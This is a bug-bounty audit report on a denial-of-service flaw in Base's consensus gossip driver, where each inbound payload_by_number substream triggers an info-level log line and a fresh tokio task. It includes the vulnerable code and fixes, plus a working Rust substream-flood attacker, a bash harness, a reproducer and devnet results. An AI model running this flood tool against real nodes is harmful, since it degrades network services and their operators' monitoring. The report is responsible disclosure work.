# 76025 bc low unbounded tokio spawn and info level logging on payload by number sync stream log cpu memory dos reachable from any connected peer

Submitted on May 2nd 2026 at 09:39:15 UTC by @coffee\_boi for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76025
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Summary

Base's consensus-layer gossip driver accepts inbound libp2p substreams on the `/opstack/req/payload_by_number/{chain_id}/0/` protocol and dispatches them through a stub handler in `crates/consensus/gossip/src/driver.rs:142-173`. For **every** inbound substream the driver:

1. Emits an `info!` log line tagged with the source peer ID (`driver.rs:155`).
2. Spawns a fresh tokio task that owns the substream until it has written the 2-byte "not-found" response (`driver.rs:157-170`).

There is no per-peer concurrency cap, no global rate limit, no per-connection request limit, and no yamux substream limit configured. A peer that has already cleared the connection-limits behaviour (the cap added in #2432, default `MAX_ESTABLISHED_PER_PEER = 1`, `MAX_ESTABLISHED = 30`) can multiplex an effectively unbounded number of substreams over its single accepted connection at the yamux layer's natural pacing. Each substream open costs the attacker one yamux SYN frame; on the receiver it costs one tokio task allocation, one heap-allocated tracing event, plus whatever yamux receive-window memory sits unread for the lifetime of the substream because the handler never `read`s the request payload.

Because the substream is treated as a fire-and-forget two-byte write, the actual cost is dominated by:

* **`info!` log volume.** Sustained substream open rate × ≈ 130 bytes per JSON / human log line. At realistic yamux pacing (single connection, single peer) this trivially saturates 10–100 MB/s of log output - enough to fill a node's local disk, push journald past its ratelimit (default `RateLimitBurst=10000`), or back-pressure structured-log forwarders (vector / fluentbit) onto the gossip task.
* **`tokio::spawn` task allocation.** Each inbound substream allocates a new task on the multi-threaded runtime. Sustained spawn rate dominates the work the swarm task can do, since every spawn happens on the same task that drives the gossip stream.
* **Unread yamux receive-window memory.** The handler never reads from `inbound_stream`, so the attacker can fill the per-stream yamux receive window (256 KB default in `libp2p-yamux 0.47.0`) on every substream before being window-throttled. With many concurrent substreams this is a slow but real heap-pressure source on top of the spawn rate.

This is reachable today by any peer that can complete the libp2p noise handshake and establish a single connection; no validator role, no Sybil, no gossip publishing, no protocol violation needed. Peer scoring (`light` mode in CLI defaults) **does not** lower scores for opening inbound substreams on this protocol - only for gossip misbehavior.

## Details

The handler is registered in `crates/consensus/gossip/src/builder.rs:188-195`:

```rust
let mut sync_handler = behaviour.sync_req_resp.new_control();

let protocol = format!("/opstack/req/payload_by_number/{l2_chain_id}/0/");
let sync_protocol_name = StreamProtocol::try_from_owned(protocol)
    .map_err(|_| GossipDriverBuilderError::SetupSyncReqRespError)?;
let sync_protocol = sync_handler
    .accept(sync_protocol_name)
    .map_err(|_| GossipDriverBuilderError::SyncReqRespAlreadyAccepted)?;
```

`libp2p_stream::Behaviour::accept` returns an `IncomingStreams` that yields one `(PeerId, Stream)` for every inbound substream that negotiates that protocol. The driver consumes it in `crates/consensus/gossip/src/driver.rs:142-173`:

```rust
pub(super) fn sync_protocol_handler(&mut self) {
    let Some(mut sync_protocol) = self.sync_protocol.take() else {
        return;
    };

    // Spawn a new task to handle the sync request/response protocol.
    tokio::spawn(async move {
        loop {
            let Some((peer_id, mut inbound_stream)) = sync_protocol.next().await else {
                warn!(target: "gossip", "The sync protocol stream has ended");
                return;
            };

            info!(target: "gossip", peer_id = %peer_id, "Received a sync request, spawning a new task to handle it");

            tokio::spawn(async move {
                // We return: not found (1), version (0). `<https://specs.optimism.io/protocol/rollup-node-p2p.html#payload_by_number>`
                // Response format: <response> = <res><version><payload>
                // No payload is returned.
                const OUTPUT: [u8; 2] = hex!("0100");

                // We only write that we're not supporting the sync request.
                if let Err(e) = inbound_stream.write_all(&OUTPUT).await {
                    error!(target: "gossip", error = %e, peer_id = %peer_id, "Failed to write the sync response");
                    return;
                };

                debug!(target: "gossip", bytes_sent = OUTPUT.len(), peer_id = %peer_id, "Sent outbound sync response");
            });
        }
    });
}
```

Every iteration of the outer loop:

1. Calls `info!(...)` - at the project-default log filter (`info` for `gossip`, see `init_test_tracing` and the production CLI defaults), this **always** emits a record.
2. Calls `tokio::spawn(...)` - unconditionally.
3. The spawned task does no read, no parse, no peer lookup, no rate-limit bookkeeping. It writes 2 constant bytes and exits.

There is no:

* per-peer request counter / cooldown
* global semaphore
* yamux `max_num_streams` override (built with `YamuxConfig::default` in `crates/consensus/gossip/src/builder.rs:200-216`; default in `libp2p-yamux 0.47` is generous)
* short-circuit when the daily/hourly volume is anomalous
* per-source IP throttle (this is L7; the connection-limits behaviour added in #2432 only counts established connections, not substreams over them)

### Why the connection-limits PR (#2432) does not contain this

PR #2432 (merged 2026-04-29) installed `libp2p::connection_limits::Behaviour` with `MAX_ESTABLISHED_INCOMING = peers_hi`, `MAX_ESTABLISHED_PER_PEER = 1`, `MAX_PENDING_INCOMING = 5`. Those caps are correct and useful, but they apply at the **connection** layer. The `payload_by_number` flood happens at the **substream** layer - yamux multiplexes many substreams over one accepted connection. From the attacker's perspective:

* Establish 1 connection (within the cap of 1 per peer, 30 total).
* Open as many `/opstack/req/payload_by_number/...` substreams as yamux's local window allows. yamux 0.13 default permits hundreds of concurrent substreams per connection and re-uses substream IDs as they close, so sustained throughput is high.
* Each substream open is one yamux SYN frame on the wire (a few bytes). Each one fires the handler above.

So #2432 raised the bar to "have one connection accepted by the victim". Once that bar is cleared, this finding is independent of #2432 and is exploitable.

### Quantifying the cost (back-of-envelope)

Empirical pacing for yamux substream open over a localhost connection sits around **1–5 µs per open**, mostly bounded by tokio scheduling and yamux frame parsing. Even at a conservative 20 µs/open the attacker can drive 50,000 substream opens/sec from a single connection. That is:

* 50,000 `info!` records/sec × \~130 bytes ≈ **6.5 MB/s** of log output.
* 50,000 `tokio::spawn` tasks/sec on the same multi-threaded runtime that the gossip event loop runs on.
* Up to **256 KB of unread yamux receive window per substream** held until the substream closes (microseconds for the 2-byte write, but the attacker controls when the *close* happens by stalling its FIN; with 1,000 concurrent substreams that is 256 MB of yamux buffer pinned).

`journald` on a typical Linux deployment with default `RateLimitInterval=30s, RateLimitBurst=10000` will start dropping `gossip` records under this load (and emit its own `Suppressed N messages from ...` records, which can themselves be rate-limited). Dropped log records mean **observability collapse on the gossip subsystem** while the attack is in flight - exactly when operators need it most. If structured logs are forwarded via vector / fluentbit / promtail with a bounded in-memory queue, the queue saturates and the gossip task experiences back-pressure on `info!` calls.

### Why peer scoring does not contain this

Peer scoring in this codebase is wired only into `behaviour.gossipsub` (`crates/consensus/gossip/src/builder.rs:170-184`: `behaviour.gossipsub.with_peer_score(...)`). The libp2p\_stream behaviour that backs the `payload_by_number` request/response path (`crates/consensus/gossip/src/behaviour.rs:39-41`, `pub sync_req_resp: libp2p_stream::Behaviour`) is a separate sub-behaviour with **no scoring hook**. So **production peer scoring (any level) does not score this request/response substream path**; it tracks only gossipsub mesh / message behaviour.

Concretely, the `light` profile (CLI default in `crates/client/cli/src/p2p.rs:154-157`) lowers scores on mesh failures, invalid gossipsub messages, and app-level `Reject` from `BlockHandler` - none of which apply to opening a `payload_by_number` substream. The `peer_monitoring` ban path (the only place that calls `peerstore.remove(...)`) therefore never fires for this attacker. The PoC runs against a devnet with `--p2p.scoring Off`, but enabling production scoring on a real node would not change reachability of this handler.

## Likelihood explanation

**High.**

1. **Permissionless reach:** any libp2p peer that has completed the noise handshake and one of the 30 inbound connection slots can run the attack. The peer already exists in the wild - discv5 is open, and inbound peers connect on their own.
2. **No required state:** the attacker does not need a validator key, a Sybil swarm, snappy/SSZ knowledge, or a chain-aware payload. One connection + one substream-open loop is sufficient.
3. **No detection signal currently fires:** `gossip_peer_count` is unaffected (the connection stays established), and the `info!` records *are* the attacker's primary effect, so there is no separate signal that is not already drowning in attacker noise.

## Recommendation

Apply three independent fixes; each addresses a different class of cost.

### 1. Drop the `tokio::spawn` and respond inline

The handler's only job is to write 2 constant bytes. Inline that work in the outer loop's task - there is no I/O wait that benefits from per-stream concurrency, and writing 2 bytes through yamux is non-blocking after the first poll. This eliminates the per-substream task allocation:

```rust
pub(super) fn sync_protocol_handler(&mut self) {
    let Some(mut sync_protocol) = self.sync_protocol.take() else {
        return;
    };

    tokio::spawn(async move {
        const OUTPUT: [u8; 2] = hex!("0100");
        while let Some((peer_id, mut inbound_stream)) = sync_protocol.next().await {
            // Inline: respond + close on the single sync-protocol task.
            if let Err(e) = inbound_stream.write_all(&OUTPUT).await {
                debug!(target: "gossip", error = %e, peer_id = %peer_id, "Failed to write sync response");
                continue;
            }
            // Best-effort close so we surrender our yamux receive window promptly.
            let _ = inbound_stream.close().await;
        }
        warn!(target: "gossip", "The sync protocol stream has ended");
    });
}
```

This collapses the cost to one task globally for the entire sync protocol, regardless of substream rate.

### 2. Demote the per-request log to `trace!`

Change `info!` at `driver.rs:155` to `trace!` (or remove it entirely; the spec is explicit that this protocol is being phased out). Replace it with a periodic aggregate metric `Metrics::sync_requests_per_minute()` so operators retain visibility without one record per stream.

```rust
// per-stream:
trace!(target: "gossip", peer_id = %peer_id, "sync request");
Metrics::sync_request_total().increment(1);

// at the swarm-task heartbeat:
let total = Metrics::sync_request_total().get();
if total > previous + ALERT_THRESHOLD {
    warn!(target: "gossip", count = total - previous, "sync request burst");
    previous = total;
}
```

### 3. Cap per-peer concurrent substreams on the sync protocol

Even with 1 + 2, an attacker can still drive substream open/close rate at high frequency. Add a per-peer in-flight counter and reject (close immediately) when a peer exceeds, say, 4 concurrent open substreams on this protocol. This neutralises the heap-pressure vector from the unread yamux receive window:

```rust
let mut in_flight: HashMap<PeerId, usize> = HashMap::new();
const PER_PEER_INFLIGHT_CAP: usize = 4;

while let Some((peer_id, mut s)) = sync_protocol.next().await {
    let n = in_flight.entry(peer_id).or_insert(0);
    if *n >= PER_PEER_INFLIGHT_CAP {
        let _ = s.close().await;
        Metrics::sync_request_dropped("over_inflight").increment(1);
        continue;
    }
    *n += 1;
    // ...respond, then decrement on completion...
}
```

Couple this with the existing peer-score system: a peer that hits the per-peer cap repeatedly should have its score lowered, so the eventual ban path in `service/src/actors/network/handler.rs:74-94` actually fires for substream-flood attackers.

### 4. (Defensive) Configure yamux `max_num_streams`

In `crates/consensus/gossip/src/builder.rs:200-216`, replace `YamuxConfig::default` with an explicit configuration that caps inbound substreams per connection. A reasonable value for Base - which only uses gossipsub plus this stub sync protocol - is on the order of 16 inbound substreams per connection. This is a defense-in-depth backstop that does not depend on the application-layer counters in fix #3.

```rust
.with_tcp(
    TcpConfig::default().nodelay(true),
    NoiseConfig::new,
    || {
        let mut cfg = YamuxConfig::default();
        cfg.set_max_num_streams(16);
        cfg
    },
)
```

## Proof of Concept

### Devnet PoC

A working Docker-devnet PoC, raw artefacts, and a measurement harness live alongside this finding:

* **Attacker crate**: `attacks/sync-flood/` - a libp2p TCP/noise/yamux client that opens substreams on `/opstack/req/payload_by_number/<chain>/0/` over a single connection.

```rust
use std::{
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    time::{Duration, Instant},
};

use anyhow::{Context, Result, anyhow};
use clap::Parser;
use futures::{AsyncReadExt, AsyncWriteExt, StreamExt};
use libp2p::{
    Multiaddr, PeerId, StreamProtocol, SwarmBuilder,
    identity::Keypair,
    multiaddr::Protocol,
    noise,
    swarm::SwarmEvent,
    tcp, yamux,
};
use tokio::sync::Notify;

#[derive(Parser, Debug)]
#[command(about = "PoC: flood opstack sync_protocol substreams against a base-consensus peer")]
struct Args {
    /// Multiaddr of the target consensus node, e.g. /ip4/127.0.0.1/tcp/7003
    #[arg(long)]
    target: String,

    /// Target peer-id (base58, e.g. 16Uiu2HAk...)
    #[arg(long)]
    peer: String,

    /// L2 chain id (used to build the protocol string).
    #[arg(long, default_value_t = 84538453)]
    chain_id: u64,

    /// Number of concurrent substream-open workers
    #[arg(long, default_value_t = 64)]
    workers: usize,

    /// Total wall-clock seconds to run the flood; 0 = run forever.
    #[arg(long, default_value_t = 60)]
    duration_secs: u64,

    /// If set, immediately drop each substream after open (no write).
    /// Otherwise we write the 0-byte payload and close, mirroring a benign client.
    #[arg(long, default_value_t = false)]
    drop_immediately: bool,
}

#[tokio::main(flavor = "multi_thread", worker_threads = 8)]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info,sync_flood=info")),
        )
        .init();

    let args = Args::parse();

    let target_peer: PeerId = args.peer.parse().context("parse peer-id")?;
    let target_addr: Multiaddr = args.target.parse().context("parse target multiaddr")?;
    let dial_addr = target_addr.clone().with(Protocol::P2p(target_peer));

    let proto = StreamProtocol::try_from_owned(format!(
        "/opstack/req/payload_by_number/{}/0/",
        args.chain_id
    ))
    .map_err(|e| anyhow!("invalid protocol string: {e}"))?;

    let kp = Keypair::generate_secp256k1();
    let local_peer = kp.public().to_peer_id();
    tracing::info!(local_peer = %local_peer, target_peer = %target_peer, target = %dial_addr, proto = %proto, "starting attacker");

    let mut swarm = SwarmBuilder::with_existing_identity(kp)
        .with_tokio()
        .with_tcp(
            tcp::Config::default().nodelay(true),
            noise::Config::new,
            yamux::Config::default,
        )?
        .with_behaviour(|_| libp2p_stream::Behaviour::new())
        .map_err(|e| anyhow!("with_behaviour: {e}"))?
        .with_swarm_config(|c| c.with_idle_connection_timeout(Duration::from_secs(3600)))
        .build();

    let mut control = swarm.behaviour_mut().new_control();

    swarm.dial(dial_addr.clone()).context("dial target")?;

    let connected = Arc::new(Notify::new());
    let connected_signal = connected.clone();

    tokio::spawn(async move {
        let mut announced = false;
        while let Some(event) = swarm.next().await {
            match event {
                SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                    tracing::info!(peer = %peer_id, "ConnectionEstablished");
                    if !announced {
                        connected_signal.notify_waiters();
                        announced = true;
                    }
                }
                SwarmEvent::OutgoingConnectionError { error, .. } => {
                    tracing::warn!(?error, "OutgoingConnectionError");
                }
                SwarmEvent::ConnectionClosed { peer_id, cause, .. } => {
                    tracing::warn!(peer = %peer_id, ?cause, "ConnectionClosed");
                }
                _ => {}
            }
        }
    });

    tokio::time::timeout(Duration::from_secs(15), connected.notified())
        .await
        .context("timed out waiting for ConnectionEstablished — is the target reachable?")?;

    tracing::info!(workers = args.workers, "starting flood loop");
    let opened = Arc::new(AtomicU64::new(0));
    let errors = Arc::new(AtomicU64::new(0));
    let acked = Arc::new(AtomicU64::new(0));

    // Reporter
    let opened_r = opened.clone();
    let errors_r = errors.clone();
    let acked_r = acked.clone();
    let reporter = tokio::spawn(async move {
        let mut last = 0u64;
        let mut last_t = Instant::now();
        let mut tick = tokio::time::interval(Duration::from_secs(1));
        loop {
            tick.tick().await;
            let now = opened_r.load(Ordering::Relaxed);
            let dt = last_t.elapsed().as_secs_f64();
            let rate = (now - last) as f64 / dt.max(0.001);
            tracing::info!(
                opened_total = now,
                acked_total = acked_r.load(Ordering::Relaxed),
                errors_total = errors_r.load(Ordering::Relaxed),
                rate_per_sec = format!("{rate:.0}"),
                "progress"
            );
            last = now;
            last_t = Instant::now();
        }
    });

    let mut handles = Vec::with_capacity(args.workers);
    for _ in 0..args.workers {
        let mut c = control.clone();
        let p = proto.clone();
        let target_peer = target_peer;
        let opened = opened.clone();
        let errors = errors.clone();
        let acked = acked.clone();
        let drop_immediately = args.drop_immediately;
        handles.push(tokio::spawn(async move {
            loop {
                match c.open_stream(target_peer, p.clone()).await {
                    Ok(mut s) => {
                        opened.fetch_add(1, Ordering::Relaxed);
                        if !drop_immediately {
                            let _ = s.write_all(&[]).await;
                            let _ = s.close().await;
                            // Read the 2-byte "not found / version 0" reply to confirm the
                            // sync_protocol_handler actually fired.
                            let mut buf = [0u8; 2];
                            if s.read_exact(&mut buf).await.is_ok() && buf == [0x01, 0x00] {
                                acked.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                        // else: drop without write/close
                    }
                    Err(e) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                        if errors.load(Ordering::Relaxed) % 1000 == 1 {
                            tracing::warn!(error = %e, "open_stream error");
                        }
                        // backoff a bit on errors
                        tokio::time::sleep(Duration::from_millis(5)).await;
                    }
                }
            }
        }));
    }

    if args.duration_secs == 0 {
        tokio::signal::ctrl_c().await.ok();
    } else {
        tokio::time::sleep(Duration::from_secs(args.duration_secs)).await;
    }

    tracing::info!(
        opened_total = opened.load(Ordering::Relaxed),
        acked_total = acked.load(Ordering::Relaxed),
        errors_total = errors.load(Ordering::Relaxed),
        "duration elapsed, shutting down"
    );

    for h in handles {
        h.abort();
    }
    reporter.abort();

    Ok(())
}
```

* **Measurement harness**: `attacks/sync-flood/run-poc.sh` - phased baseline / attack / recovery, sampling `process_resident_memory_bytes`, `process_cpu_seconds_total`, victim log-line counts, and `opp2p_peerCount` once per second.

```sh
#!/usr/bin/env bash
# PoC measurement harness for the unbounded-spawn / INFO-log DoS in the opstack
# sync_protocol handler at crates/consensus/gossip/src/driver.rs:142-172.
#
# Phases:
#   1. Baseline   30 s — no attacker
#   2. Attack     60 s — sync-flood active
#   3. Recovery   30 s — attacker stopped
#
# Per-second samples:
#   - process_resident_memory_bytes (Prometheus)
#   - process_cpu_seconds_total      (Prometheus, deltad to a per-sec rate)
#   - "Received a sync request" log line count (deltad)
#   - total log line count                     (deltad)
#
# Outputs:
#   /tmp/sync-flood-poc/poc.csv
#   /tmp/sync-flood-poc/cl.log    (full victim log captured during the run)
#   /tmp/sync-flood-poc/attacker.log
#   /tmp/sync-flood-poc/summary.txt

set -euo pipefail

TARGET_MULTIADDR="${TARGET_MULTIADDR:-/ip4/127.0.0.1/tcp/7003}"
TARGET_PEER="${TARGET_PEER:-16Uiu2HAkxp9nAsXsCthNWPkkpm4yG1eW7L4ENpVyzDZM8HE1yr12}"
CHAIN_ID="${CHAIN_ID:-84538453}"
METRICS_URL="${METRICS_URL:-http://localhost:7300/metrics}"
RPC_URL="${RPC_URL:-http://localhost:7549}"
VICTIM_CONTAINER="${VICTIM_CONTAINER:-base-builder-cl}"
WORKERS="${WORKERS:-32}"
BASELINE_SECS="${BASELINE_SECS:-30}"
ATTACK_SECS="${ATTACK_SECS:-60}"
RECOVERY_SECS="${RECOVERY_SECS:-30}"
DROP_IMMEDIATELY="${DROP_IMMEDIATELY:-false}"   # set to true to leak yamux windows

OUT="/tmp/sync-flood-poc"
mkdir -p "$OUT"
CSV="$OUT/poc.csv"
LOGFILE="$OUT/cl.log"
ATTLOG="$OUT/attacker.log"
SUMMARY="$OUT/summary.txt"

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
ATTACKER_BIN="$ROOT/attacks/sync-flood/target/release/sync-flood"

if [ ! -x "$ATTACKER_BIN" ]; then
    echo "attacker binary not built at $ATTACKER_BIN" >&2
    echo "build it first: (cd attacks/sync-flood && cargo build --release)" >&2
    exit 1
fi

scrape_metric() {
    local name="$1"
    curl -s "$METRICS_URL" | awk -v n="$name" '$1==n {print $2; exit}'
}

# Start follow-tail of victim into LOGFILE.
# Filter to only the lines relevant to the PoC + a few control words, to avoid
# saturating disk with the L1-origin-selector WARN spam in this devnet.
: > "$LOGFILE"
docker logs --since=0s --tail=0 -f "$VICTIM_CONTAINER" 2>&1 \
    | grep --line-buffered -E "Received a sync request|sync.protocol|Connection (Established|Closed)|peer_id" \
    >"$LOGFILE" &
LOGGER_PID=$!
trap 'kill $LOGGER_PID 2>/dev/null; [ -n "${ATTACK_PID:-}" ] && kill $ATTACK_PID 2>/dev/null; exit' INT TERM

# Header
echo "epoch_s,phase,rss_bytes,cpu_total_s,cpu_delta_s,log_lines_total,log_lines_delta,sync_request_lines_total,sync_request_lines_delta,gossip_peer_count" > "$CSV"

prev_cpu=""
prev_logs=0
prev_sync=0

scrape_gossip_peers() {
    curl -sX POST -H 'Content-Type: application/json' \
        --data '{"jsonrpc":"2.0","method":"opp2p_peerCount","params":[],"id":1}' \
        "$RPC_URL" 2>/dev/null \
        | sed -nE 's/.*"connectedGossip":([0-9]+).*/\1/p'
}

sample_loop() {
    local phase="$1"
    local seconds="$2"
    local i
    for ((i = 0; i < seconds; i++)); do
        local now
        now=$(date +%s)
        local rss
        rss=$(scrape_metric process_resident_memory_bytes || echo "")
        local cpu
        cpu=$(scrape_metric process_cpu_seconds_total || echo "")
        local lines
        lines=$(wc -l < "$LOGFILE" | tr -d ' ')
        local sync_lines
        sync_lines=$(awk '/Received a sync request/{c++} END{print c+0}' "$LOGFILE")
        local peers
        peers=$(scrape_gossip_peers || echo "")

        local cpu_d="0"
        if [[ -n "$prev_cpu" && -n "$cpu" ]]; then
            cpu_d=$(awk -v a="$cpu" -v b="$prev_cpu" 'BEGIN{printf "%.3f",(a-b)}')
        fi
        local lines_d=$((lines - prev_logs))
        local sync_d=$((sync_lines - prev_sync))

        echo "$now,$phase,$rss,$cpu,$cpu_d,$lines,$lines_d,$sync_lines,$sync_d,$peers" >> "$CSV"
        prev_cpu="$cpu"
        prev_logs=$lines
        prev_sync=$sync_lines
        sleep 1
    done
}

echo ">>> phase 1: baseline ${BASELINE_SECS}s"
sample_loop baseline "$BASELINE_SECS"

echo ">>> phase 2: attack ${ATTACK_SECS}s (workers=$WORKERS, drop_immediately=$DROP_IMMEDIATELY)"
DROP_FLAG=""
if [ "$DROP_IMMEDIATELY" = "true" ]; then
    DROP_FLAG="--drop-immediately"
fi
"$ATTACKER_BIN" \
    --target "$TARGET_MULTIADDR" \
    --peer "$TARGET_PEER" \
    --chain-id "$CHAIN_ID" \
    --workers "$WORKERS" \
    --duration-secs "$ATTACK_SECS" \
    $DROP_FLAG > "$ATTLOG" 2>&1 &
ATTACK_PID=$!
sample_loop attack "$ATTACK_SECS"
wait $ATTACK_PID || true
ATTACK_PID=""

echo ">>> phase 3: recovery ${RECOVERY_SECS}s"
sample_loop recovery "$RECOVERY_SECS"

kill $LOGGER_PID 2>/dev/null || true

# Summary
{
    echo "=== sync_protocol DoS PoC ==="
    echo "victim:           $VICTIM_CONTAINER ($TARGET_MULTIADDR p2p $TARGET_PEER)"
    echo "chain_id:         $CHAIN_ID"
    echo "workers:          $WORKERS"
    echo "drop_immediately: $DROP_IMMEDIATELY"
    echo "phases:           ${BASELINE_SECS}s / ${ATTACK_SECS}s / ${RECOVERY_SECS}s"
    echo
    echo "Per-phase aggregates from $CSV:"
    awk -F, 'NR>1 {
        c[$2]++;
        if ($5 != "") cpu[$2] += $5;
        sync[$2] += $9;
        logd[$2] += $7;
        if (rss_min[$2]+0 == 0 || $3 < rss_min[$2]) rss_min[$2] = $3;
        if ($3+0 > rss_max[$2]+0) rss_max[$2] = $3;
        rss_last[$2] = $3;
        if (peer_min[$2]+0 == 0 || ($10+0 < peer_min[$2]+0)) peer_min[$2] = $10;
        if (peer_max[$2]+0 == 0 || ($10+0 > peer_max[$2]+0)) peer_max[$2] = $10;
    } END {
        for (p in c) {
            printf "  %-9s  samples=%d  cpu_total=%.2fs  cpu_avg=%.2f%%  rss_min=%s  rss_max=%s  rss_delta=%s  logs_total=%d  sync_total=%d  peers=%s..%s\n",
                p, c[p], cpu[p], (cpu[p]/c[p])*100, rss_min[p], rss_max[p], rss_max[p]-rss_min[p], logd[p], sync[p], peer_min[p], peer_max[p];
        }
    }' "$CSV"
    echo
    echo "Attacker stats (last lines):"
    tail -5 "$ATTLOG"
} | tee "$SUMMARY"
```

The canonical run targets the **follower** consensus node (`base-client-cl`, port `8003`, RPC `8549`, metrics `8300`) so the sequencer's CPU/log signal is not muddied. Headline result from a single attacker, single TCP connection, 40 s burst:

| Metric                            | Baseline (20 s) | Attack (40 s)   | Recovery (20 s) |
| --------------------------------- | --------------- | --------------- | --------------- |
| `Received a sync request` lines   | 0               | **30,766**      | 0               |
| Peak log rate                     | 0/s             | **\~900/s**     | 0/s             |
| `process_cpu_seconds_total` delta | 0 s             | **22 s**        | 2 s             |
| `opp2p_peerCount.connectedGossip` | 1               | **2** (1 + atk) | 1               |

The 30,766 victim log lines all carry the same attacker `peer_id`, confirming this is a single-peer / single-connection cost - not a Sybil or connection-count attack. See the results file for the raw `summary.txt`, attacker tail, victim log samples, and unique-peer-id check.

### Reproducer:

```bash
cd etc/docker && just up-single
cd ../../attacks/sync-flood && cargo build --release
docker logs base-client-cl 2>&1 | grep "local_peer_id" | head -1   # grab follower peer-id

RPC_URL=http://localhost:8549 \
TARGET_MULTIADDR=/ip4/127.0.0.1/tcp/8003 \
TARGET_PEER=<follower-peer-id> \
METRICS_URL=http://localhost:8300/metrics \
VICTIM_CONTAINER=base-client-cl \
WORKERS=64 BASELINE_SECS=20 ATTACK_SECS=40 RECOVERY_SECS=20 \
./run-poc.sh
```

### Output

#### `summary.txt` (verbatim)

```
=== sync_protocol DoS PoC ===
victim:           base-client-cl (/ip4/127.0.0.1/tcp/8003 p2p 16Uiu2HAm6SqFgRYYWBnDvBeBeHHeA1Bg3V5vUSkSdJ2zBFgt2svE)
chain_id:         84538453
workers:          64
drop_immediately: false
phases:           20s / 40s / 20s

Per-phase aggregates from /tmp/sync-flood-poc/poc.csv:
  baseline   samples=20  cpu_total=0.00s  cpu_avg=0.00%   rss_min=303775744  rss_max=303775744  rss_delta=0        logs_total=0      sync_total=0      peers=1..1
  attack     samples=40  cpu_total=22.00s cpu_avg=55.00%  rss_min=303775744  rss_max=307707904  rss_delta=3932160  logs_total=30767  sync_total=30766  peers=1..2
  recovery   samples=20  cpu_total=2.00s  cpu_avg=10.00%  rss_min=307707904  rss_max=308363264  rss_delta=655360   logs_total=0      sync_total=0      peers=1..1
```

#### Last 5 attacker progress lines (`/tmp/sync-flood-poc/attacker.log`)

```
INFO sync_flood: progress opened_total=27677 acked_total=27671 errors_total=0 rate_per_sec="775"
INFO sync_flood: progress opened_total=28275 acked_total=28270 errors_total=0 rate_per_sec="598"
INFO sync_flood: progress opened_total=29056 acked_total=29051 errors_total=0 rate_per_sec="781"
INFO sync_flood: progress opened_total=29941 acked_total=29936 errors_total=0 rate_per_sec="885"
INFO sync_flood: progress opened_total=30770 acked_total=30765 errors_total=0 rate_per_sec="829"
INFO sync_flood: duration elapsed, shutting down opened_total=30770 acked_total=30765 errors_total=0
```

#### First 5 victim sync-request log lines (`/tmp/sync-flood-poc/cl.log`)

```
2026-05-02T09:20:11.356016Z  INFO gossip: Received a sync request, spawning a new task to handle it peer_id=16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
2026-05-02T09:20:11.357833Z  INFO gossip: Received a sync request, spawning a new task to handle it peer_id=16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
2026-05-02T09:20:11.359671Z  INFO gossip: Received a sync request, spawning a new task to handle it peer_id=16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
2026-05-02T09:20:11.361587Z  INFO gossip: Received a sync request, spawning a new task to handle it peer_id=16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
2026-05-02T09:20:11.364026Z  INFO gossip: Received a sync request, spawning a new task to handle it peer_id=16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
```

#### Single-peer / single-connection proof

Unique attacker peer-ids observed across **all 30,766** sync-request log lines:

```bash
$ grep "Received a sync request" /tmp/sync-flood-poc/cl.log \
    | sed -E 's/.*peer_id[^=]*=//' | sed -E 's/\x1b\[[0-9;]*m//g' | sort -u
16Uiu2HAmTtSmw6DduMaRHBu1xUT7qF9VadziS7nU7rNEvQaYdYZq
```

`opp2p_peerCount` sampled across the run (one row per phase):

```
phase     epoch_s     connectedGossip
baseline  1777713592  1
attack    1777713626  2
recovery  1777713663  1
```

Both confirm: one attacker peer-id, one TCP connection above the baseline link, 30,766 handler invocations.
